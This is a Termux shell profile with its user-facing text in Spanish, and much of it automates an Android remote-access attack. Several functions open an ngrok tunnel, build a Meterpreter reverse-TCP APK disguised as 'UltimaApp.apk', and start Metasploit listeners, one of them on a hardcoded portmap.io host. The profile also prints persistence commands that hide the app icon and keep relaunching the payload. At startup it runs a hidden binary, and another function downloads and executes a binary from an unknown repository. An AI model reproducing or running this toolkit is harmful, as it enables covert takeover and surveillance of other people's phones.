if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ];then 
        command_not_found_handle () {
                /data/data/com.termux/files/usr/libexec/termux/command-not-found " $ 1 "
        }
fi



function dw {
cd /sdcard/download
ls
}


function bit {
termux-open https://bitly.com
}


function ingo {
chmod 777 $2
if [ "$1" = "./" ];then
./$2
else
$1 $2
fi
}


function ip {
ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
printf "$ip" 
} 


function up {
pkg update -y
pkg upgrade -y
}


function tv {
clear
cd
cd ..
if [ -x .tmux-bits ];then
cd
cd ..
source .tmux-bits
case $bits-act in
32)
cd
./tmux-viewer
;;
64)
cd
unset LD_PRELOAD
./tmux-viewer
;;
esac
else
clear
printf "Tu dispositivo es de 32 o 64 bits ?

$ce[$ve 01$ce ]$am 32 bits
$ce[$ve 02$ce ]$am 64 bits


"
read -p "[1/2] >>  " opc3264
case $opc3264 in
01|1)
cd
cd ..
echo "
#!/bin/bash

bits-act="32"
" > .tmux-bits
;;
02|2)
cd
cd ..
echo "
#!/bin/bash

bits-act="64"
" > .tmux-bits
;;
esac
cd
git clone https://github.com/SaidGR/bwnzq12
cd bwnzq12
mv tmux-viewer $HOME
cd
rm -Rf $HOME/bwnzq12
cd
cd ..
source .tmux-bits
case $bits-act in
32)
cd
chmod 777 tmux-viewer
./tmux-viewer
;;
64)
cd
unset LD_PRELOAD
chmod 777 tmux-viewer
./tmux-viewer
;;
esac
fi
}


function acot {
clear
printf "
dw       =====> Habre la carpeta de descargas "download" y lista el contenido que hay en ella

up       =====> Busca, descarga y actualiza los paquetes de termux (pkg update y pkg upgrade) 

ip       =====> muestra en pantalla la IP actual del dispositivo

tv       =====> activa una sesión de termux viewer para permitir el acceso remoto a otro movil

bit      =====> Abre la página de bit.ly para acortar links sin añadirles publicidad

clone    =====> Clona repositorios de git solicitando el nombre del creador y del repositorio 

sess1    =====> Crea un túnel de ngrok con el puerto 5555

sess2    =====> Abre una consola msfconsole, utilizando el puerto 5555 y con el host de ngrok

sess3    =====> Crea un payload al que solo le debes colocar el puerto de 5 dígitos de ngrok

sess4    =====> Abre una consola de metasploit solo solicitando el host y port para abrirla

sess4 -u  ====> Abre una consola de metasploit utilizando el host y port del último sess4

sess3 -a  ====> Crea un Payload infectado con metasploit solicitando solo el host y port

sess1 -e  ====> Abre la sesión 1 y ejecutalo... Luego solo abre la sesión 2 y 3 sin colocarles ningún comando; ¿QUE HARÁ EL SCRIPT? en la sesión #1 creará el túnel con ngrok, en la sesión #2 abrirá la consola msfconsole automáticamente esperando la sesión del payload de la sesión 3.... Y por último en la sesión #3 creará un payload infectado al cual solo deberás colocarle el puerto de 5 dígitos que te brinda ngrok en la sesión 1
"
}

function sess1 {
if [ "$1" = "-e" ];then
cd
cd
mkdir emerpay
mkdir emerpay3
clear
cd
ngrok tcp 5555
else
cd
ngrok tcp 5555
fi
}
function sess2 {
clear
msfconsole -q -r $PREFIX/lib/config-base
}
function sess3 {
if [ "$1" = "-a" ];then
read -p "host : " host
read -p "port : " puerto
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$puerto R > /sdcard/download/UltimaApp.apk
clear
printf "
[ + ] El Payload se guardo en /sdcard/download/UltimaApp.apk
[ + ] Con el Host $host
[ + ] Con el puerto $puerto
"
exit
fi
if [ -x $HOME/SG/emerpay3 ];then
rm -Rf emerpay3
clear
read -p "puerto: " puerto
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
clear
printf "
==========
wakelock
hide_app_icon
shell

==========
#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done

==========

"
read -p "$ " hgjkdw
else
clear
read -p "puerto: " puerto
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
fi
}
function sess4 {
if [ "$1" = "-u" ];then
msfconsole -q -r $PREFIX/lib/configuration-old
exit
fi
cd
cd $PREFIX/lib
rm -Rf configuration-old
mv configuration-act configuration-old
cd
clear
read -p "HOST= " host12
read -p "PORT= " port12
echo "
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $host12
set LPORT $port12
exploit
" > $PREFIX/lib/configuration-act
cd
clear
msfconsole -q -r $PREFIX/lib/configuration-act
}
function sess5 {
cd
rm -Rf .dcof
echo "
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST SaidGR51015-44781.portmap.io
set LPORT 4546
exploit

" > $HOME/.dcof
clear
printf "

==========
wakelock
hide_app_icon
shell

==========
#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done

==========

"
msfconsole -q -r $HOME/.dcof
}



function clone {
read -p "nombre del creador: " creado
read -p "nombre del archivo: " archiv
git clone https://github.com/$creado/$archiv
}

ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)

dw="/sdcard/download"

if [ -x $HOME/SG/emerpay ];then
cd
cd SG 
mv emerpay emerpay2
cd
sess2
fi
if [ -x $HOME/SG/emerpay2 ];then
cd 
cd SG
rm -Rf emerpay2
cd
clear
sess3
fi

if [ -x $PREFIX/bin/said ];then
cd
cd SG
cd .up
chmod 777 .up07
./.up07
cd
said
fi

PS1='$ '
